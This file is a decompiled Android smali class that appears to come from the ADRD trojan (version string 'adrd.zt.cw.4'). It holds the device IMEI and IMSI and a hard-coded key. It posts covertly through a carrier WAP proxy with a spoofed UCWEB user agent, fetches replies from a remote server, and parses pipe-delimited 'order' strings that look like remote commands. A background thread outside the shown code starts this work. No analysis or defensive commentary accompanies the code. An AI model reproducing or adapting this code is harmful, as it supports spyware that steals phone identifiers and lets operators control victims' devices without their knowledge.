.class public Lcom/xxx/yyy/qzl;
.super Ljava/lang/Object;
.source "qzl.java"


# instance fields
.field private context:Landroid/content/Context;

.field public doflag:I

.field private imei:Ljava/lang/String;

.field private imsi:Ljava/lang/String;

.field private iversion:Ljava/lang/String;

.field private kk:Ljava/lang/String;

.field public netway:I

.field private oversion:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V
    .locals 1
    .param p1, "ct"    # Landroid/content/Context;
    .param p2, "is"    # Ljava/lang/String;
    .param p3, "im"    # Ljava/lang/String;
    .param p4, "way"    # I

    .prologue
    .line 34
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 31
    const-string v0, "6"

    iput-object v0, p0, Lcom/xxx/yyy/qzl;->iversion:Ljava/lang/String;

    .line 32
    const-string v0, "adrd.zt.cw.4"

    iput-object v0, p0, Lcom/xxx/yyy/qzl;->oversion:Ljava/lang/String;

    .line 33
    const/4 v0, 0x0

    iput v0, p0, Lcom/xxx/yyy/qzl;->doflag:I

    .line 36
    iput-object p1, p0, Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;

    .line 37
    iput-object p2, p0, Lcom/xxx/yyy/qzl;->imsi:Ljava/lang/String;

    .line 38
    iput-object p3, p0, Lcom/xxx/yyy/qzl;->imei:Ljava/lang/String;

    .line 39
    iput p4, p0, Lcom/xxx/yyy/qzl;->netway:I

    .line 40
    const-string v0, "48734154"

    iput-object v0, p0, Lcom/xxx/yyy/qzl;->kk:Ljava/lang/String;

    .line 42
    return-void
.end method

.method private CheckNetWork(Ljava/lang/String;)Z
    .locals 10
    .param p1, "url"    # Ljava/lang/String;

    .prologue
    const/4 v9, 0x0

    .line 200
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 201
    .local v1, "httpClient":Lorg/apache/http/impl/client/DefaultHttpClient;
    iget v6, p0, Lcom/xxx/yyy/qzl;->netway:I

    if-nez v6, :cond_0

    .line 203
    new-instance v3, Lorg/apache/http/HttpHost;

    const-string v6, "10.0.0.172"

    const/16 v7, 0x50

    const-string v8, "http"

    invoke-direct {v3, v6, v7, v8}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;ILjava/lang/String;)V

    .line 204
    .local v3, "proxy":Lorg/apache/http/HttpHost;
    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v6

    const-string v7, "http.route.default-proxy"

    invoke-interface {v6, v7, v3}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 206
    .end local v3    # "proxy":Lorg/apache/http/HttpHost;
    :cond_0
    new-instance v2, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v2, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 207
    .local v2, "method":Lorg/apache/http/client/methods/HttpPost;
    const-string v6, "User-Agent"

    const-string v7, "J2ME/UCWEB7.4.0.57"

    invoke-virtual {v2, v6, v7}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 208
    const-string v6, "Accept"

    const-string v7, "application/vnd.wap.xhtml+xml,application/xml,text/vnd.wap.wml,text/html,application/xhtml+xml,image/jpeg;q=0.5,image/png;q=0.5,image/gif;q=0.5,image/*;q=0.6,video/*,audio/*,*/*;"

    invoke-virtual {v2, v6, v7}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 212
    :try_start_0
    invoke-virtual {v1, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v4

    .line 213
    .local v4, "resp":Lorg/apache/http/HttpResponse;
    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v6

    invoke-interface {v6}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v5

    .line 215
    .local v5, "status":I
    const/16 v6, 0xc8

    if-eq v5, v6, :cond_1

    move v6, v9

    .line 230
    .end local v4    # "resp":Lorg/apache/http/HttpResponse;
    .end local v5    # "status":I
    :goto_0
    return v6

    .line 217
    .restart local v4    # "resp":Lorg/apache/http/HttpResponse;
    .restart local v5    # "status":I
    :cond_1
    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v6

    invoke-interface {v6}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 218
    const/4 v6, 0x1

    goto :goto_0

    .line 219
    .end local v4    # "resp":Lorg/apache/http/HttpResponse;
    .end local v5    # "status":I
    :catch_0
    move-exception v6

    move-object v0, v6

    .line 221
    .local v0, "e":Lorg/apache/http/client/ClientProtocolException;
    invoke-virtual {v0}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V

    move v6, v9

    .line 222
    goto :goto_0

    .line 223
    .end local v0    # "e":Lorg/apache/http/client/ClientProtocolException;
    :catch_1
    move-exception v6

    move-object v0, v6

    .line 225
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    move v6, v9

    .line 226
    goto :goto_0

    .line 227
    .end local v0    # "e":Ljava/io/IOException;
    :catch_2
    move-exception v6

    move-object v0, v6

    .line 229
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    move v6, v9

    .line 230
    goto :goto_0
.end method

.method private GetO(Ljava/lang/String;)Ljava/lang/String;
    .locals 12
    .param p1, "url"    # Ljava/lang/String;

    .prologue
    const-string v11, ""

    .line 238
    new-instance v2, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 239
    .local v2, "httpClient":Lorg/apache/http/impl/client/DefaultHttpClient;
    iget v8, p0, Lcom/xxx/yyy/qzl;->netway:I

    if-nez v8, :cond_0

    .line 241
    new-instance v4, Lorg/apache/http/HttpHost;

    const-string v8, "10.0.0.172"

    const/16 v9, 0x50

    const-string v10, "http"

    invoke-direct {v4, v8, v9, v10}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;ILjava/lang/String;)V

    .line 242
    .local v4, "proxy":Lorg/apache/http/HttpHost;
    invoke-virtual {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v8

    const-string v9, "http.route.default-proxy"

    invoke-interface {v8, v9, v4}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 245
    .end local v4    # "proxy":Lorg/apache/http/HttpHost;
    :cond_0
    new-instance v3, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v3, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 247
    .local v3, "method":Lorg/apache/http/client/methods/HttpPost;
    const-string v8, "User-Agent"

    const-string v9, "J2ME/UCWEB7.4.0.57"

    invoke-virtual {v3, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 248
    const-string v8, "Accept"

    const-string v9, "application/vnd.wap.xhtml+xml,application/xml,text/vnd.wap.wml,text/html,application/xhtml+xml,image/jpeg;q=0.5,image/png;q=0.5,image/gif;q=0.5,image/*;q=0.6,video/*,audio/*,*/*;"

    invoke-virtual {v3, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 259
    :try_start_0
    invoke-virtual {v2, v3}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v5

    .line 260
    .local v5, "resp":Lorg/apache/http/HttpResponse;
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    move-result v7

    .line 262
    .local v7, "status":I
    const/16 v8, 0xc8

    if-eq v7, v8, :cond_1

    .line 263
    const-string v8, ""

    move-object v8, v11

    .line 282
    .end local v5    # "resp":Lorg/apache/http/HttpResponse;
    .end local v7    # "status":I
    :goto_0
    return-object v8

    .line 265
    .restart local v5    # "resp":Lorg/apache/http/HttpResponse;
    .restart local v7    # "status":I
    :cond_1
    :try_start_1
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    .line 267
    .local v1, "entity":Lorg/apache/http/HttpEntity;
    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v8

    invoke-virtual {p0, v8}, Lcom/xxx/yyy/qzl;->generateString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v6

    .line 269
    .local v6, "result":Ljava/lang/String;
    invoke-virtual {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V
    :try_end_1
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    move-object v8, v6

    .line 270
    goto :goto_0

    .line 271
    .end local v1    # "entity":Lorg/apache/http/HttpEntity;
    .end local v5    # "resp":Lorg/apache/http/HttpResponse;
    .end local v6    # "result":Ljava/lang/String;
    .end local v7    # "status":I
    :catch_0
    move-exception v8

    move-object v0, v8

    .line 273
    .local v0, "e":Lorg/apache/http/client/ClientProtocolException;
    invoke-virtual {v0}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V

    .line 274
    const-string v8, ""

    move-object v8, v11

    goto :goto_0

    .line 275
    .end local v0    # "e":Lorg/apache/http/client/ClientProtocolException;
    :catch_1
    move-exception v8

    move-object v0, v8

    .line 277
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 278
    const-string v8, ""

    move-object v8, v11

    goto :goto_0

    .line 279
    .end local v0    # "e":Ljava/io/IOException;
    :catch_2
    move-exception v8

    move-object v0, v8

    .line 281
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 282
    const-string v8, ""

    move-object v8, v11

    goto :goto_0
.end method

.method private ParseO(Ljava/lang/String;)V
    .locals 14
    .param p1, "od"    # Ljava/lang/String;

    .prologue
    .line 112
    const-string v9, ""

    .line 113
    .local v9, "sendmdn":Ljava/lang/String;
    const-string v6, ""

    .line 114
    .local v6, "order":Ljava/lang/String;
    const-string v12, "\\|"

    invoke-virtual {p1, v12}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    .line 115
    .local v10, "strs":[Ljava/lang/String;
    array-length v12, v10

    const/4 v13, 0x4

    if-lt v12, v13, :cond_0

    .line 117
    const/4 v12, 0x0

    aget-object v9, v10, v12

    .line 118
    const/4 v12, 0x1

    aget-object v6, v10, v12

    .line 120
    const/4 v8, 0x1

    .line 121
    .local v8, "sPos":I
    const/4 v2, 0x0

    .line 122
    .local v2, "ePos":I
    const/4 v3, 0x0

    .line 123
    .local v3, "flag":I
    const/4 v0, 0x1

    .line 124
    .local v0, "Count":I
    const/4 v5, 0x0

    .line 125
    .local v5, "needFlash":Z
    const/4 v12, 0x2

    aget-object v12, v10, v12

    invoke-virtual {v12}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    .line 126
    .local v1, "chars":[C
    const/4 v4, 0x0

    .local v4, "i":I
    :goto_0
    array-length v12, v1

    if-lt v4, v12, :cond_1

    .line 155
    const/4 v12, 0x2

    aget-object v12, v10, v12

    invoke-virtual {v12, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->length()I

    .line 165
    const/4 v12, 0x3

    aget-object v7, v10, v12

    .line 166
    .local v7, "part4":Ljava/lang/String;
    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v12

    const/4 v13, 0x1

    if-le v12, v13, :cond_0

    .line 168
    const-string v12, "\\["

    invoke-virtual {v7, v12}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    .line 174
    .end local v0    # "Count":I
    .end local v1    # "chars":[C
    .end local v2    # "ePos":I
    .end local v3    # "flag":I
    .end local v4    # "i":I
    .end local v5    # "needFlash":Z
    .end local v7    # "part4":Ljava/lang/String;
    .end local v8    # "sPos":I
    :cond_0
    return-void

    .line 128
    .restart local v0    # "Count":I
    .restart local v1    # "chars":[C
    .restart local v2    # "ePos":I
    .restart local v3    # "flag":I
    .restart local v4    # "i":I
    .restart local v5    # "needFlash":Z
    .restart local v8    # "sPos":I
    :cond_1
    aget-char v12, v1, v4

    const/16 v13, 0x2b

    if-ne v12, v13, :cond_4

    .line 130
    move v2, v4

    .line 131
    if-le v2, v8, :cond_2

    .line 133
    const/4 v12, 0x2

    aget-object v12, v10, v12

    invoke-virtual {v12, v8, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v11

    .line 136
    .local v11, "t":Ljava/lang/String;
    const/4 v5, 0x1

    .line 138
    .end local v11    # "t":Ljava/lang/String;
    :cond_2
    add-int/lit8 v8, v2, 0x1

    .line 139
    const/4 v3, 0x1

    .line 126
    :cond_3
    :goto_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 141
    :cond_4
    aget-char v12, v1, v4

    const/16 v13, 0x2d

    if-ne v12, v13, :cond_3

    .line 143
    move v2, v4

    .line 144
    if-le v2, v8, :cond_5

    .line 146
    const/4 v12, 0x2

    aget-object v12, v10, v12

    invoke-virtual {v12, v8, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v11

    .line 149
    .restart local v11    # "t":Ljava/lang/String;
    const/4 v5, 0x1

    .line 151
    .end local v11    # "t":Ljava/lang/String;
    :cond_5
    add-int/lit8 v8, v2, 0x1

    .line 152
    const/4 v3, 0x0

    goto :goto_1
.end method

.method static synthetic access$0(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 26
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->imei:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$1(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 25
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->imsi:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$2(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 31
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->iversion:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$3(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 32
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->oversion:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$4(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 28
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->kk:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$5(Lcom/xxx/yyy/qzl;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 233
    invoke-direct {p0, p1}, Lcom/xxx/yyy/qzl;->GetO(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$6(Lcom/xxx/yyy/qzl;)Landroid/content/Context;
    .locals 1

    .prologue
    .line 29
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$7(Lcom/xxx/yyy/qzl;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 110
    invoke-direct {p0, p1}, Lcom/xxx/yyy/qzl;->ParseO(Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method public GG()V
    .locals 1

    .prologue
    .line 46
    new-instance v0, Lcom/xxx/yyy/qzl$1;

    invoke-direct {v0, p0}, Lcom/xxx/yyy/qzl$1;-><init>(Lcom/xxx/yyy/qzl;)V

    .line 108
    invoke-virtual {v0}, Lcom/xxx/yyy/qzl$1;->start()V

    .line 109
    return-void
.end method

.method public generateString(Ljava/io/InputStream;)Ljava/lang/String;
    .locals 6
    .param p1, "stream"    # Ljava/io/InputStream;

    .prologue
    .line 176
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 177
    .local v3, "reader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 178
    .local v0, "buffer":Ljava/io/BufferedReader;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 181
    .local v4, "sb":Ljava/lang/StringBuilder;
    :goto_0
    :try_start_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .local v1, "cur":Ljava/lang/String;
    if-nez v1, :cond_0

    .line 190
    .end local v1    # "cur":Ljava/lang/String;
    :goto_1
    :try_start_1
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 195
    :goto_2
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    return-object v5

    .line 182
    .restart local v1    # "cur":Ljava/lang/String;
    :cond_0
    :try_start_2
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 185
    .end local v1    # "cur":Ljava/lang/String;
    :catch_0
    move-exception v5

    move-object v2, v5

    .line 187
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 191
    .end local v2    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v2

    .line 193
    .restart local v2    # "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method
